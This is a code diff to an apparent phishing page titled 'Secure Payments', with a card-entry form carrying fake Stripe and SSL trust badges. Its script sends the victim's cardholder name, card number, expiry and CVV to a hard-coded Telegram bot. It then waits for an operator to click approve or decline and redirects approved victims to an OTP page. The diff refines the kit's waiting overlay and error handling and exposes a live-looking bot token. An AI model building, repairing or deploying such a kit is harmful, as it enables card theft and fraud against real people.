@@ -5,8 +5,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Secure Payments</title>
+
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -247,7 +249,6 @@
         .secure-note .fa-lock {
             color: #1fcc53;
         }
-        /* status + inline block area */
         
         .status-box {
             margin-top: 14px;
@@ -294,7 +295,6 @@
         .muted {
             color: #999;
         }
-        /* ...your existing CSS... */
         
         .spinner {
             width: 18px;
@@ -313,10 +313,49 @@
                 transform: rotate(360deg);
             }
         }
-        /* optional: make button text dim when spinning */
         
         .btn.is-waiting {
             opacity: 0.9;
+        }
+        /* ===== Waiting overlay (spinner) ===== */
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .overlay.active {
+            display: flex;
+        }
+        
+        .overlay-box {
+            background: white;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: min(360px, 90vw);
+        }
+        
+        .overlay-box .spinner {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #007BFF;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .overlay-box p {
+            margin: 0;
+            color: #444;
+            font-size: 0.95rem;
         }
     </style>
 </head>
@@ -331,8 +370,10 @@
                 <i class="fab fa-cc-visa"></i>
                 <i class="fab fa-cc-mastercard"></i>
             </div>
+
             <div class="chip"></div>
             <div class="cp-number" id="cp-number">•••• •••• •••• ••••</div>
+
             <div class="cp-row">
                 <span>NAME&nbsp; <b id="cp-name">•••• ••••</b></span>
                 <span>EXP&nbsp; <b id="cp-exp">••/••</b></span>
@@ -347,7 +388,8 @@
 
             <div class="input-group">
                 <label for="card-number">Card Number</label>
-                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number" /> </div>
+                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number" />
+            </div>
 
             <div class="card-exp-cvv">
                 <div class="input-group">
@@ -364,18 +406,16 @@
             <div class="otp-error" id="otp-error"></div>
 
             <button type="submit" class="btn" id="submitButton">
-            <i class="fas fa-lock"></i>&nbsp;
-            <span class="spinner" id="btnSpinner" aria-hidden="true"></span>
-              <span id="btnText">Confirm Payments</span>
-              </button>
+        <i class="fas fa-lock"></i>&nbsp;
+        <span class="spinner" id="btnSpinner" aria-hidden="true"></span>
+        <span id="btnText">Confirm Payments</span>
+      </button>
 
             <div class="status-box" id="statusBox">
                 <div><b id="statusTitle">Waiting…</b></div>
                 <div class="muted" id="statusSub">Fill all inputs to enable verification.</div>
-                <div class="inline-block-row" aria-hidden="true">
-                    <div class="tiny-pill" id="pill1">Telegram: waiting approval</div>
-                    <div class="tiny-pill" id="pill2">Inline buttons: Approve / Decline</div>
-                </div>
+
+
             </div>
         </form>
 
@@ -387,52 +427,61 @@
                 <i class="fab fa-cc-mastercard"></i>
                 <i class="fab fa-cc-stripe"></i>
             </div>
+
             <div class="stripe-tag">
                 <i class="fab fa-stripe-s"></i> Powered by Stripe
             </div>
-            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
+
+            <div class="secure-note">
+                <i class="fas fa-lock"></i> 256-bit SSL secured payment
+            </div>
         </div>
     </div>
+
 
     <script>
         // ─── Telegram Bot Config ────────────────────────────────────────
         const botToken = '8804812021:AAGhN2YVUJHibFOM-Ip8eR4iDtjNHVBHrMs';
         const chatId = '8752862997';
 
-
-        const cardNumberInput = document.getElementById('card-number');
-
-        function formatCardNumber16(value) {
-            const digits = value.replace(/\D/g, '').slice(0, 16);
-            // Group as 4-4-4-4
-            return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
-        }
-
-        cardNumberInput.addEventListener('input', () => {
-            const beforeCursor = cardNumberInput.selectionStart;
-            const formatted = formatCardNumber16(cardNumberInput.value);
-            cardNumberInput.value = formatted;
-
-            // Keep it simple: don’t over-tune cursor position (works fine for most cases).
-        });
-
-        cardNumberInput.addEventListener('blur', () => {
-            const digits = cardNumberInput.value.replace(/\D/g, '');
-            if (digits.length !== 16) {
-                // Don’t forcefully clear; just let submit validation show message.
-            }
-        });
-        // ─── DOM refs (FIXED IDs) ────────────────────────────────────────
-        const btnSpinner = document.getElementById('btnSpinner');
+        // ─── DOM refs ───────────────────────────────────────────────────
         const form = document.getElementById('payment-form');
         const submitBtn = document.getElementById('submitButton');
-        const statusMsg = document.getElementById('statusSub'); // shows subtext
-        const statusBox = document.getElementById('statusBox'); // container
+        const btnSpinner = document.getElementById('btnSpinner');
+        const btnText = document.getElementById('btnText');
+
+        const statusMsg = document.getElementById('statusSub');
+        const statusBox = document.getElementById('statusBox');
         const statusTitle = document.getElementById('statusTitle');
-        const btnText = document.getElementById('btnText'); // span inside button
+        const otpError = document.getElementById('otp-error');
+
+        // ✅ FIX #1: Ensure overlay element exists (your HTML doesn't have it)
+        // Create it if it's missing so overlay.classList won't crash.
+        let overlay = document.getElementById('waiting-overlay');
+        if (!overlay) {
+            overlay = document.createElement('div');
+            overlay.id = 'waiting-overlay';
+            overlay.className = 'overlay';
+            overlay.innerHTML = `
+            <div class="overlay-box">
+                <div class="spinner"></div>
+                <p>Processing…</p>
+            </div>
+        `;
+            document.body.appendChild(overlay);
+        }
+
         const inputs = form.querySelectorAll('input');
 
-        // ─── Helpers ─────────────────────────────────────────────────────
+        const cardNumberInput = document.getElementById('card-number');
+        const cardNameInput = document.getElementById('card-name');
+        const expirationInput = document.getElementById('expiration');
+
+        const cpNumber = document.getElementById('cp-number');
+        const cpName = document.getElementById('cp-name');
+        const cpExp = document.getElementById('cp-exp');
+
+        // ─── Helpers ───────────────────────────────────────────────────
         function generateId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
         }
@@ -444,19 +493,65 @@
         }
 
         function resetForm() {
-            inputs.forEach(inp => inp.value = '');
+            inputs.forEach(inp => (inp.value = ''));
+
+            otpError.textContent = '';
+            overlay.classList.remove('active');
+
             setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
             submitBtn.disabled = false;
+
+            btnSpinner.style.display = 'none';
+            submitBtn.classList.remove('is-waiting');
             btnText.textContent = 'Confirm Payments';
-            statusTitle.textContent = 'Waiting…';
-            statusMsg.textContent = 'Fill all inputs to enable verification.';
         }
 
         function showDecline(msg) {
-            statusTitle.textContent = 'Declined';
-            statusMsg.textContent = msg;
-            setStatus(true);
+            otpError.textContent = msg;
+            btnSpinner.style.display = 'none';
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('is-waiting');
+            btnText.textContent = 'Confirm Payments';
+
+            overlay.classList.remove('active');
+            setStatus(true, 'Declined', msg);
         }
+
+        function formatCardNumber(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 16);
+            return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        function maskCardPreview() {
+            return '•••• •••• •••• ••••';
+        }
+
+        function formatExpiration(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 4);
+            if (digits.length <= 2) return digits;
+            return digits.slice(0, 2) + '/' + digits.slice(2);
+        }
+
+        // ─── Live preview bindings ──────────────────────────────────────
+        cardNumberInput.addEventListener('input', () => {
+            cardNumberInput.value = formatCardNumber(cardNumberInput.value);
+
+            const digits = cardNumberInput.value.replace(/\D/g, '');
+            // ✅ FIX #2: maskCardPreview() takes no params
+            cpNumber.textContent = digits.length ? maskCardPreview() : '•••• •••• •••• ••••';
+        });
+
+        cardNameInput.addEventListener('input', () => {
+            const name = cardNameInput.value.trim();
+            cpName.textContent = name ? name.toUpperCase().replace(/\s+/g, ' ').slice(0, 12) : '•••• ••••';
+        });
+
+        expirationInput.addEventListener('input', () => {
+            expirationInput.value = formatExpiration(expirationInput.value);
+            const v = expirationInput.value;
+
+            cpExp.textContent = v && v.length >= 4 ? v : '••/••';
+        });
 
         // ─── Poll Telegram for callback decision ───────────────────────
         function pollForDecision(submissionId) {
@@ -469,49 +564,57 @@
                     );
                     const data = await resp.json();
 
-                    if (data.ok && data.result) {
+                    if (data.ok && Array.isArray(data.result) && data.result.length) {
                         for (const update of data.result) {
                             offset = update.update_id + 1;
 
                             if (update.callback_query) {
                                 const cb = update.callback_query;
-                                const cbData = cb.data || ''; // "approve_xxx" or "decline_xxx"
+                                const cbData = cb.data || '';
+
                                 const parts = cbData.split('_');
-                                const action = parts[0]; // "approve" or "decline"
+                                const action = parts[0];
                                 const id = parts.slice(1).join('_');
 
                                 if (id === submissionId) {
                                     clearInterval(poll);
+                                    overlay.classList.remove('active');
+
+                                    btnSpinner.style.display = 'none';
+                                    submitBtn.classList.remove('is-waiting');
 
                                     if (action === 'approve') {
                                         window.location.href = 'otp.html';
                                     } else {
                                         showDecline('❌ Card details were declined. Please re-enter.');
                                         resetForm();
-                                        const card = document.querySelector('.card');
 
-                                        card &&
-                                            card.scrollIntoView({
-                                                behavior: 'smooth'
-                                            });
-                                        btnSpinner.style.display = 'none';
-                                        submitBtn.classList.remove('is-waiting');
+                                        const card = document.querySelector('.card');
+                                        if (card) card.scrollIntoView({
+                                            behavior: 'smooth'
+                                        });
                                     }
+                                    return;
                                 }
                             }
                         }
                     }
                 } catch (err) {
                     console.error('Poll error:', err);
+                    clearInterval(poll);
+                    overlay.classList.remove('active');
                     btnSpinner.style.display = 'none';
-                    submitBtn.classList.remove('is-waiting');
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Confirm Payments';
                 }
             }, 2000);
         }
 
-        // ─── Form submission ───────────────────────────────────────────
+        // ─── Form submission ────────────────────────────────────────────
         form.addEventListener('submit', function(e) {
             e.preventDefault();
+
+            otpError.textContent = '';
 
             const cardName = document.getElementById('card-name').value.trim();
             const cardNumber = document.getElementById('card-number').value.trim();
@@ -520,7 +623,7 @@
 
             const cardDigits = cardNumber.replace(/\D/g, '');
 
-            if (!cardName || !expiration || !cvv || !cardDigits) {
+            if (!cardName || !cardNumber || !expiration || !cvv || !cardDigits) {
                 showDecline('⚠️ Please fill in all fields.');
                 return;
             }
@@ -530,12 +633,10 @@
                 return;
             }
 
-            // Disable button to prevent double-submit
             submitBtn.disabled = true;
-            btnSpinner.style.display = 'inline-block';
             submitBtn.classList.add('is-waiting');
-            btnText.textContent = 'Waiting approval...';
-            setStatus(true, 'Waiting…', 'Awaiting approval in Telegram...');
+            btnSpinner.style.display = 'inline-block';
+            btnText.textContent = 'Waiting for approval...';
 
             const submissionId = generateId();
 
@@ -560,7 +661,8 @@
                 ]
             };
 
-            // ─── Send to Telegram ──────────────────────────────────────
+            overlay.classList.add('active');
+
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -576,18 +678,25 @@
                     if (!response.ok) return response.text().then(t => {
                         throw new Error(t);
                     });
-
-                    // Success → show status + start polling
-                    setStatus(true, 'Waiting…', 'Awaiting approval..');
                     pollForDecision(submissionId);
                 })
                 .catch(error => {
                     console.error('Telegram Error:', error);
-                    showDecline('❌ Error while approving. Please try again.');
+
+                    overlay.classList.remove('active');
                     submitBtn.disabled = false;
+                    btnSpinner.style.display = 'none';
+                    submitBtn.classList.remove('is-waiting');
                     btnText.textContent = 'Confirm Payments';
+
+                    setStatus(true, 'Error', '❌ Error sending data to Telegram. Please try again.');
+                    otpError.textContent = '❌ Error sending data to Telegram. Please try again.';
                 });
         });
+
+        // Initial state
+        setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
+        btnSpinner.style.display = 'none';
     </script>
 </body>
 
